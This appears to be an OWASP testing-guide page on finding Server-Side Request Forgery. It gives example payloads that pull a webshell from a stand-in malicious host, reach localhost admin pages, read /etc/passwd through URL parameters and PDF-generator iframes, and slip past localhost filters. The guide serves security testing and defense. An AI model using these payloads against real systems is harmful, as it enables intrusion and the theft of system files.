# Testing for Server-Side Request Forgery

## Summary

Often web applications may have to interact with internal or external resources in order to provide certain functionality, with the expectation that only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for injection attacks that are called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases it can even lead to Remote Code Execution (RCE).

## Test Objectives

- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

## How to Test

When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. However internal systems often contain sensitive data or functionality.

If we have the following request:

`https://example.com/page?page=about.php`, we can try the following payloads:

Return the content of an external resource like a webshell.

`https://example.com/page?page=https://malicioussite.com/shell.php`

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.

`https://example.com/page?page=http://localhost/admin`

or

`https://example.com/page?page=http://127.0.0.1/admin`

Fetch a local file

`https://example.com/page?page=file:///etc/passwd`

All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
One important note on SSRF with POST requests is that the SSRF may also manifest in a Blind manner, because the application might not return anything immediately, that data might be used in other functionality such as PDF reports, invoice/order handling, etc. which are visible to employees/staff but not necessarily the end user or tester.

You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [References section](#references).

### PDF Generators

There are some cases where server converts uploaded file to a pdf.Try injecting `<iframe>`, `<img>`, `<base>` or `<script>` elements or CSS `url()` functions pointing to internal services.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Common Filter Bypass

Some applications block references to `localhost` and `127.0.0.1`, this can be circumvented by:

- Using alternative IP representation such as the below examples that evaluate to `127.0.01`:
  - Decimal notation: `2130706433`
  - Octal notation: `017700000001`
  - IP shortening: `127.1`
- String obfuscation
- Registering your own domain that resolves to `127.0.0.1`

Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented.

- Using the `@` character: `https://expected-domain@attacker-domain`
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- URL encoding
- Fuzzing
- Combinations of all of the above

For additional payloads and bypass techniques, check the [references](#references) section.

## Remediation

SSRF is known to be one of the hardest attacks to block or stop without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, check out the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## References

- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
